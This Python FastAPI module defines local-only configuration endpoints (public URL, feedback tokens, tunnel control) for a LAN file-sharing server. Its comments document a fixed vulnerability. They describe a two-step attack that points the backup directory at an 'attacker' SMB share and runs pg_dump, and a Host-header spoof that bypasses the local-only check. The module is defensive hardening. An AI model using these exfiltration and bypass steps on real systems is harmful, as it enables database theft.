"""本机专用的配置端点：给桌面托盘 / 控制面板用。

存在的理由和 /local/qr 一样：桌面端没有登录态，调不动 /admin/* 那套接口，
但它确实需要读写几个「服务层」的配置（不是用户数据，是这台机器怎么对外）。

所有端点都只允许本机访问，判定逻辑用 security.effective_client_ip ——
那套逻辑处理了「经 Caddy 反代后 client.host 全是 127.0.0.1」这个陷阱。

内容范围刻意收得很窄：只有公网入口地址。别的东西（账号、权限、文件）
一律不放这里，那些必须走正常的认证通道。
"""

from __future__ import annotations

from urllib.parse import urlsplit

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel
from starlette.concurrency import run_in_threadpool

from app import settings
from app.security import effective_client_ip, is_public_entry

router = APIRouter()

_LOOPBACKS = ("127.0.0.1", "::1", "localhost")


def _require_local(request: Request) -> None:
    """非本机一律 403。

    🔴 只看 IP 是不够的，这是 2026-11-04 审查抓到的 P0。

    FRP 隧道的物理链路是「公网 → frps → frpc(本机) → Caddy → 127.0.0.1:8766」。
    Caddy 看到的 remote_host 就是 127.0.0.1，注入的 X-Real-IP 也是
    127.0.0.1 —— 于是**公网陌生人发来的请求和桌面托盘发来的请求，
    在 IP 这个维度上完全一样**。只判 IP 等于把这组免登录端点对整个公网开放：

      · POST /local/backup/dir  {"dir": "\\\\attacker\\share"}   ← 改备份目录
      · POST /local/backup/run                                    ← 触发 pg_dump
        两步合起来 = 整个数据库（口令哈希、会话哈希、全部元数据）被写到
        攻击者的 SMB 共享上。
      · POST /local/public-url   ← 清空/篡改公网入口配置
      · GET  /local/backup       ← 泄露磁盘绝对路径与备份清单

    项目自己在 security.py 里早就写明了「FRP 使 client_ip 全为 127.0.0.1、
    不能按 IP 区分内外」，而 is_public_entry() 就是照这条结论做的可信判据：
    Caddy 在隧道端口注入 X-LanShare-Entry: public，客户端伪造不了。
    这里之前没有用它，属于同一个结论只落了一半。
    """
    if is_public_entry(request):
        raise HTTPException(status_code=403, detail="该接口仅限本机访问")
    ip = effective_client_ip(request)
    if ip not in _LOOPBACKS:
        raise HTTPException(status_code=403, detail="该接口仅限本机访问")
    # 第三道门，且不依赖 is_public_entry：Host 必须明确是回环地址。
    #
    # 为什么需要：隧道流量经 frpc → Caddy → 127.0.0.1，来源恒为回环，所以
    # 上面那道 `ip in _LOOPBACKS` 挡不住它；唯一能区分「本机直连」与「公网经
    # 隧道进来」的就是 Host。而 is_public_entry 的 fail-closed 分支在
    # `_is_private_host(host)` 为真时直接跳过 —— 攻击者发
    # `Host: <一个私网地址>:8765` 就能让整组 /local/* 对公网敞开
    # （2026-11-17 实测：两步即可把整库 pg_dump 到攻击者 SMB）。
    #
    # 所以这里反向要求「Host 必须是回环」，而不是「不像公网就当本机」。
    _host = (request.headers.get("host") or "").strip().lower()
    if _host.startswith("["):
        _host = _host[: _host.find("]") + 1]
    else:
        _host = _host.split(":")[0]
    if _host not in ("127.0.0.1", "localhost", "[::1]", "::1"):
        raise HTTPException(status_code=403, detail="该接口仅限本机访问")


class PublicUrlBody(BaseModel):
    # 备用入口已删除（2026-11-04 用户要求）。旧版托盘仍会多传一个 url_alt
    # 字段，Pydantic 默认忽略未知字段，所以旧客户端不会因此报错。
    url: str = ""
    # 接入方式："frp" | "cloudflare"。缺省 frp —— 改造前只有 FRP 这条路，
    # 老客户端不传这个字段时行为必须与以前完全一致。
    mode: str = "frp"


_MODE_LABELS = {"frp": "穿透服务（FRP）", "cloudflare": "Cloudflare Tunnel"}


def _coerce_mode(stored: str, url: str) -> str:
    """把库里的 mode 推导成有效值（读时兼容存量数据）。

    改造前只可能是 FRP，所以「有地址但没 mode」一定是历史 FRP 配置。
    """
    if stored in _MODE_LABELS:
        return stored
    return "frp" if url else ""


def _normalize(raw: str) -> tuple[str, str]:
    """把用户输入整理成规范形式，返回 (存库值, 错误说明)。

    用户可能输入：
        xxx.frp-any.com:35391       → 补 https://
        https://xxx.frp-any.com:35391/
        http://<私网地址>:8765    → 允许，但要提醒这不是公网地址

    空字符串表示「清除配置」，合法。
    """
    text = (raw or "").strip()
    if not text:
        return "", ""

    if not text.startswith(("http://", "https://")):
        # 没写协议：默认 https。公网入口几乎都是 HTTPS，
        # 而 sakuraFrp 的「自动 HTTPS」也是这个假设。
        text = "https://" + text

    parts = urlsplit(text)
    if not parts.netloc:
        return "", f"地址里没有主机名：{raw}"

    # 去掉尾部斜杠，存库统一形态（前端拼路径时不会出现双斜杠）
    normalized = f"{parts.scheme}://{parts.netloc}"
    return normalized, ""


@router.get("/local/public-url")
async def get_public_url(request: Request):
    """读当前配置的公网入口地址。

    返回的 url 是存库值；available 表示服务器实际能不能读库
    （比如数据库还没初始化时 get_setting 会抛异常）。
    """
    _require_local(request)
    try:
        primary = settings.get_setting(settings.PUBLIC_BASE_URL)
        stored_mode = settings.get_setting(settings.PUBLIC_ACCESS_MODE)
    # 读不到要说出来，不能装作空配置（项目已 ignore BLE001，无需 noqa）
    except Exception as exc:
        return {"url": "", "mode": "", "available": False,
                "error": f"读取配置失败：{exc}"}
    mode = _coerce_mode(stored_mode, primary)
    # 两种方式各自最后用过的地址，供面板在非当前方式那一栏回填，
    # 让用户看得见「我上次填的是什么」（切回来不用重新查）。
    saved = {
        "frp": settings.get_setting(settings.PUBLIC_URL_FRP) or "",
        "cloudflare": settings.get_setting(settings.PUBLIC_URL_CLOUDFLARE) or "",
    }
    # FRP 客户端状态顺手带上：面板要显示「方式一现在有没有在跑」。
    # 并进同一个响应而不是新开一个端点 —— 面板 5~10 秒刷一次状态，
    # 多一次往返纯属浪费，而且两边的刷新节奏还会错开。
    # tasklist 约 30ms，放线程池里跑，别阻塞事件循环。
    from app.services.tunnel_ctl import frp_status

    try:
        frp = await run_in_threadpool(frp_status)
    # 拿不到状态就说拿不到，不能让整个配置读取跟着失败
    except Exception as exc:
        frp = {"running": False, "count": 0, "pids": [],
               "managed_by_us": False, "error": f"读取失败：{exc}"}

    return {"url": primary or "", "mode": mode, "available": True, "error": "",
            "mode_label": _MODE_LABELS.get(mode, ""), "saved": saved, "frp": frp}


@router.post("/local/public-url")
async def set_public_url(request: Request, body: PublicUrlBody):
    """保存公网入口地址。

    保存后立即清掉 security 的 netloc 缓存，否则要等 60 秒才生效 ——
    用户填完点「验证」会以为没保存成功。
    """
    _require_local(request)

    primary, err = _normalize(body.url)
    if err:
        raise HTTPException(status_code=422, detail=err)

    mode = (body.mode or "frp").strip().lower()
    if mode not in _MODE_LABELS:
        raise HTTPException(status_code=422,
                            detail=f"未知的接入方式：{body.mode}")
    # 清空地址时 mode 一起清掉，避免「没有地址却记着方式」的悬空状态
    if not primary:
        mode = ""

    # Cloudflare 这条路对地址形态有硬要求（不能带端口/路径）。probe 会查，
    # 但后端自己也拦一道 —— 托盘不是唯一的调用方，将来 CLI 也会写这个端点。
    if mode == "cloudflare" and primary:
        from app.services.public_probe import check_format

        fmt_ok, fmt_detail, fmt_hint, _host = check_format(primary)
        if not fmt_ok:
            raise HTTPException(status_code=422, detail=fmt_hint or fmt_detail)

    try:
        # 原子写：URL / MODE / 清历史备用地址，一次事务一次 commit。
        # 分三次 set_setting 会在中途失败时留下「地址已改、方式没改」的矛盾态。
        payload = {
            settings.PUBLIC_BASE_URL: primary,
            settings.PUBLIC_ACCESS_MODE: mode,
            # 顺手清掉历史备用地址：这个字段已经没有读取方，留着只会在
            # App 的入口清单里冒出一个连不上的旧地址（2026-11-04 实机见过
            # 一个指向另一条隧道端口的僵尸值）。
            settings.PUBLIC_BASE_URL_ALT: "",
        }
        # 按模式各记一份「上次填的地址」，切回来时回填用。
        # 只写有地址的情况：清空某一栏不应把历史抹掉（用户清的是当前入口，
        # 不是「我以后再也不填这个方式了」）。
        if primary:
            if mode == "frp":
                payload[settings.PUBLIC_URL_FRP] = primary
            elif mode == "cloudflare":
                payload[settings.PUBLIC_URL_CLOUDFLARE] = primary
        settings.set_settings(payload)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"保存失败：{exc}") from exc

    # 改完立即生效（不然防爆破的公网/LAN 分账要等 60 秒才切过来）
    try:
        from app.security import reset_netloc_cache

        reset_netloc_cache()
    # 缓存清不掉不影响保存结果
    except Exception:
        pass

    # T3（2026-11-05）：同理清掉 /api/app/entries 的 60 秒缓存 —— 托盘改完
    # 地址，App 端最长 60 秒还在拿旧值。备用入口已删，这是唯一写入口，
    # 漏清的「改了没生效」每次改地址都会发生。
    try:
        from app.api.appver import reset_entries_cache

        reset_entries_cache()
    except Exception:
        pass

    return {"ok": True, "url": primary}


# ───────────────────────── 反馈上报配置（v4.0.9 P2） ─────────────────────────
# 和更新源同一套心智模型：本机可以填一个「自己维护的接收端」，没填就走公开通道。
# 区别在于反馈是**推**不是拉：推失败等于数据丢失，所以这里只管「往哪推」，
# 落盘永远在本地先做完。
#
# 逻辑写成两个纯函数（read/apply），因为 /local 与 /api/admin 两条通道都要用：
# 托盘没有登录态走 /local，网页设置页走 admin。两处各写一遍必然漂移。

_SECRET_KEYS = (
    settings.FEEDBACK_RELAY_TOKEN,
    settings.FEEDBACK_GH_TOKEN,
    settings.FEEDBACK_INBOX_TOKEN,
)


def _mask(v: str) -> str:
    """token 只回「设了没 / 多少位」，绝不回明文 —— 这个页面可能被投屏或截图。"""
    v = (v or "").strip()
    return f"已设置（{len(v)} 位）" if v else ""


class FeedbackConfigBody(BaseModel):
    enabled: bool | None = None          # 自定义地址上报开关
    url: str | None = None               # 接收端地址
    token: str | None = None             # 发送方 Bearer（写入用，不回显）
    source: str | None = None            # 本机标识
    gh_enabled: bool | None = None       # 本机直连 GitHub（开发端自用）
    gh_repo: str | None = None
    gh_token: str | None = None
    inbox_token: str | None = None       # 本机作为接收端时用


def read_feedback_config() -> dict:
    try:
        g = settings.get_setting
        return {
            "enabled": (g(settings.FEEDBACK_RELAY_ENABLED, "") or "").strip() == "1",
            "url": g(settings.FEEDBACK_RELAY_URL, "") or "",
            "token": _mask(g(settings.FEEDBACK_RELAY_TOKEN, "")),
            "source": g(settings.FEEDBACK_SOURCE, "") or "lanshare",
            "gh_enabled": (g(settings.FEEDBACK_GH_ENABLED, "") or "").strip() == "1",
            "gh_repo": g(settings.FEEDBACK_GH_REPO, "") or "",
            "gh_token": _mask(g(settings.FEEDBACK_GH_TOKEN, "")),
            "inbox_token": _mask(g(settings.FEEDBACK_INBOX_TOKEN, "")),
            "available": True,
            "error": "",
        }
    except Exception as exc:
        return {"available": False, "error": f"读取配置失败：{exc}"}


def apply_feedback_config(body: FeedbackConfigBody) -> None:
    """校验并逐项落库。

    逐项而不是整份覆盖：地址和 token 是两个输入框，用户可能只改一个。
    整份覆盖会让「只改地址」把 token 清空 —— 而且界面上看不出来
    （token 框显示的是脱敏文案），下次上报静默失败。
    """
    url = (body.url or "").strip()
    if url and not url.lower().startswith(("http://", "https://")):
        raise HTTPException(status_code=422, detail="上报地址必须是 http:// 或 https:// 开头")
    if url.lower().startswith("http://") and "127.0.0.1" not in url and "localhost" not in url:
        raise HTTPException(
            status_code=422,
            detail="明文 http 只允许本机。对外接收端必须用 https —— token 会跟着请求发出去",
        )
    repo = (body.gh_repo or "").strip()
    if repo and "/" not in repo:
        raise HTTPException(status_code=422, detail="仓库写成 owner/repo")

    if body.enabled is not None:
        settings.set_setting(settings.FEEDBACK_RELAY_ENABLED, "1" if body.enabled else "")
    if body.url is not None:
        settings.set_setting(settings.FEEDBACK_RELAY_URL, url)
    if body.token is not None:
        settings.set_setting(settings.FEEDBACK_RELAY_TOKEN, body.token.strip())
    if body.source is not None:
        raw = body.source.strip()
        src = "".join(
            ch for ch in raw if ch.isalnum() or ch in "_-" or "\u4e00" <= ch <= "\u9fff"
        )
        settings.set_setting(settings.FEEDBACK_SOURCE, src[:40] or "lanshare")
    if body.gh_enabled is not None:
        settings.set_setting(settings.FEEDBACK_GH_ENABLED, "1" if body.gh_enabled else "")
    if body.gh_repo is not None:
        settings.set_setting(settings.FEEDBACK_GH_REPO, repo)
    if body.gh_token is not None:
        settings.set_setting(settings.FEEDBACK_GH_TOKEN, body.gh_token.strip())
    if body.inbox_token is not None:
        settings.set_setting(settings.FEEDBACK_INBOX_TOKEN, body.inbox_token.strip())


@router.get("/local/feedback-config")
async def get_feedback_config(request: Request):
    _require_local(request)
    return read_feedback_config()


@router.post("/local/feedback-config")
async def set_feedback_config(request: Request, body: FeedbackConfigBody):
    _require_local(request)
    try:
        apply_feedback_config(body)
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"保存失败：{exc}") from exc
    return {"ok": True}


# ───────────────────── 公网域名检测 / 隧道启停（2026-11-18）─────────────────────
# 托盘「公网访问 → Cloudflare Tunnel」栏目的后端。
#
# 设计要点见 docs/_internal/设计-公网域名栏目-20261118.md，这里只强调三件事：
#   1. probe 是**只读**的，不落库 —— 用户可以先看检测结果再决定是否启用
#   2. probe 内部全是同步网络 IO（urllib + DNS + tasklist），必须走线程池，
#      直接 await 会把整个事件循环卡住最长 30 秒（这正是本批 review 修过的
#      「阻塞调用留在 async def」那一类问题）
#   3. probe 的最后一步是**同源校验**：比对公网与本机的 /api/instance-id，
#      防止用户把域名填成别人的服务器


class ProbeBody(BaseModel):
    url: str = ""


@router.post("/local/public-url/probe")
async def probe_public_url(request: Request, body: ProbeBody):
    """检测一个公网域名是否可用、是否指向本机。只读，不落库。

    返回结构见 app/services/public_probe.py::probe。
    `ok=true` 才应该允许保存；环境检测项（cloudflared 装没装、TUN 开没开）
    只做提示，不影响 ok。
    """
    _require_local(request)
    from app.services.public_probe import probe

    return await run_in_threadpool(probe, body.url)


@router.get("/local/tunnel")
async def get_tunnel(request: Request):
    """隧道当前状态（服务名 / 状态 / 进程 / 能否可靠启停）。"""
    _require_local(request)
    from app.services.tunnel_ctl import tunnel_status

    return await run_in_threadpool(tunnel_status)


@router.post("/local/tunnel/stop")
async def stop_tunnel(request: Request):
    """停掉本机的 cloudflared 隧道。

    ⚠️ 这会**真的断开公网访问**，不只是改一个显示字段。
    服务形态可以再启动回来；前台进程形态杀掉后程序无能为力（不知道启动参数）。
    返回里的 `method` 区分这两种情形，`detail` 是给用户看的结果说明。
    """
    _require_local(request)
    from app.services.tunnel_ctl import tunnel_stop

    return await run_in_threadpool(tunnel_stop)


@router.post("/local/tunnel/start")
async def start_tunnel(request: Request):
    """启动本机的 cloudflared 服务（仅服务形态可行）。"""
    _require_local(request)
    from app.services.tunnel_ctl import tunnel_start

    return await run_in_threadpool(tunnel_start)


@router.get("/local/transfer-tunnels")
async def get_transfer_tunnels(request: Request):
    """读传输隧道配置。

    返回 mode="follow" 时 tunnels 一定是空的（两者表达同一件事，
    不让「custom 但列表为空」这种自相矛盾的状态流到前端）。
    """
    _require_local(request)
    from app.services.transfer_tunnels import MAX_TUNNELS, load

    mode, tunnels = load()
    return {"mode": mode, "tunnels": tunnels, "max": MAX_TUNNELS}


class _TunnelItem(BaseModel):
    url: str = ""


class TransferTunnelsBody(BaseModel):
    mode: str = "follow"
    tunnels: list[_TunnelItem] = []


@router.post("/local/transfer-tunnels")
async def set_transfer_tunnels(request: Request, body: TransferTunnelsBody):
    """保存传输隧道。

    逐条校验 + **同源校验**：这些地址必须指向本机这台服务端。
    不同源的话 App 会把文件下载请求发到别人的服务器 —— 下到的不是自己的文件，
    而且会把会话 Cookie 一起送过去。

    同源判定复用 /api/instance-id（4.0.17 加的，只回 UUID 不回别的）。
    """
    _require_local(request)

    from app.services.transfer_tunnels import (
        MAX_TUNNELS, _bad, load, normalize, save,
    )

    mode = "custom" if (body.mode or "").strip().lower() == "custom" else "follow"

    # mode=follow 时忽略列表（等价于「关掉这个功能」）
    if mode == "follow":
        save([])
        _clear_entries_cache()
        return {"ok": True, "mode": "follow", "tunnels": []}

    urls = [i.url for i in body.tunnels if (i.url or "").strip()]
    if not urls:
        # custom 但没填地址 —— 退回 follow，别留悬空状态
        save([])
        _clear_entries_cache()
        return {"ok": True, "mode": "follow", "tunnels": [],
                "note": "没有填地址，已退回「跟随主入口」"}
    if len(urls) > MAX_TUNNELS:
        raise HTTPException(status_code=422,
                            detail=f"最多 {MAX_TUNNELS} 条")

    clean: list[str] = []
    for raw in urls:
        ok, detail, hint = _bad(raw)
        if not ok:
            raise HTTPException(status_code=422,
                                detail=f"{raw}：{hint or detail}")
        norm = normalize(raw)
        if norm in clean:          # 重复项直接去重，不报错
            continue
        clean.append(norm)

    # 同源校验：逐个问 /api/instance-id，和本机 UUID 比对
    local_id = settings.ensure_instance_id()
    from app.services.public_probe import _http_get

    checked: list[str] = []
    for url in clean:
        status, body_bytes, err = await run_in_threadpool(
            _http_get, f"{url}/api/instance-id", 8)
        if err:
            raise HTTPException(
                status_code=422,
                detail=f"{url}：连不上（{err}）。"
                       f"如果这条隧道现在没开，可以先启动它再保存")
        if status != 200:
            raise HTTPException(
                status_code=422,
                detail=f"{url}：/api/instance-id 返回 {status}")
        try:
            import json as _json

            remote_id = _json.loads(body_bytes).get("instance_id", "")
        # 返回体不是 JSON 就说明指向的不是 LANShare
        except Exception:
            raise HTTPException(
                status_code=422,
                detail=f"{url}：响应的不是 LANShare 实例标识接口") from None
        if remote_id != local_id:
            raise HTTPException(
                status_code=422,
                detail=f"{url}：指向的是另一台服务器"
                       f"（实例标识 {remote_id[:8]}… ≠ 本机 {local_id[:8]}…）。"
                       f"传输隧道必须是本机的另一个入口")
        checked.append(url)

    save(checked)
    _clear_entries_cache()
    mode2, tunnels2 = load()
    return {"ok": True, "mode": mode2, "tunnels": tunnels2}


def _clear_entries_cache() -> None:
    """清 /api/app/entries 的 60 秒缓存，让 App 立刻拿到新列表。
    与 set_public_url 里的做法一致（那边有详细说明）。"""
    try:
        from app.api.appver import _ENTRIES_CACHE

        _ENTRIES_CACHE.clear()
    # 缓存清不掉不影响保存结果
    except Exception:
        pass


@router.get("/local/tunnel/frp")
async def get_frp_status(request: Request):
    """FRP 客户端（frpc）的存活状态，只读。

    面板用它显示「方式一现在有没有在跑」。**不提供启停**：frpc 可能是
    樱花启动器这类第三方 GUI 拉起来的，进程归那个程序管，从这里杀会被
    立刻重新拉起（详见 tunnel_ctl.frp_status 的说明）。
    """
    _require_local(request)
    from app.services.tunnel_ctl import frp_status

    return await run_in_threadpool(frp_status)
